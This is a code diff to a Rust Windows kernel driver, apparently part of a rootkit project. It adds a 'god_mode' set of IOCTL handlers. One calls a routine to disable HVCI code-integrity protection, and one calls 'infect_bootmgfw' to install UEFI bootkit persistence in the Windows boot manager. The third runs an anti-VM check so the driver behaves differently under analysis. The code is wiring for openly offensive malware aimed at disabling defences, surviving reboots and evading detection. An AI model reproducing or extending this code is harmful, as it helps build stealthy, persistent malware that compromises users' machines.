@@ -89,6 +89,7 @@ impl IoctlManager {
         self.port();
         self.driver();
         self.misc();
+        self.god_mode();
 
         #[cfg(not(feature = "mapper"))]
         {
@@ -770,6 +771,49 @@ impl IoctlManager {
                 // Set the size of the returned information.
                 (*irp).IoStatus.Information = (entries_to_copy * size_of::<CallbackInfoOutput>()) as u64;
                 Ok(STATUS_SUCCESS)
+            }
+        }));
+    }
+
+    /// Registers the IOCTL handlers for God-Tier operations (HVCI, UEFI, AntiVM).
+    fn god_mode(&mut self) {
+        // HVCI Bypass attempt
+        self.register_handler(HVCI_BYPASS, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION| {
+            unsafe {
+                let target = get_input_buffer::<TargetProcess>(stack)?;
+                // Call core hvci module
+                let status = shadow_core::hvci::disable_hvci()?;
+                
+                (*irp).IoStatus.Information = size_of::<TargetProcess>() as u64;
+                Ok(status)
+            }
+        }));
+
+        // UEFI Bootkit Persistence
+        self.register_handler(UEFI_PERSIST, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION| {
+            unsafe {
+                let target = get_input_buffer::<TargetInjection>(stack)?;
+                let path = (*target).path.as_str();
+                
+                // Call core bootkit module
+                let status = shadow_core::bootkit::infect_bootmgfw(path)?;
+                
+                (*irp).IoStatus.Information = size_of::<TargetInjection>() as u64;
+                Ok(status)
+            }
+        }));
+
+        // Anti-VM check (Enhanced)
+        self.register_handler(ANTIVM_CHECK, Box::new(|irp: *mut IRP, _: *mut IO_STACK_LOCATION| {
+            unsafe {
+                let status = if shadow_core::antivm::is_vm_detected() {
+                    STATUS_UNSUCCESSFUL
+                } else {
+                    STATUS_SUCCESS
+                };
+                
+                (*irp).IoStatus.Information = 0;
+                Ok(status)
             }
         }));
     }
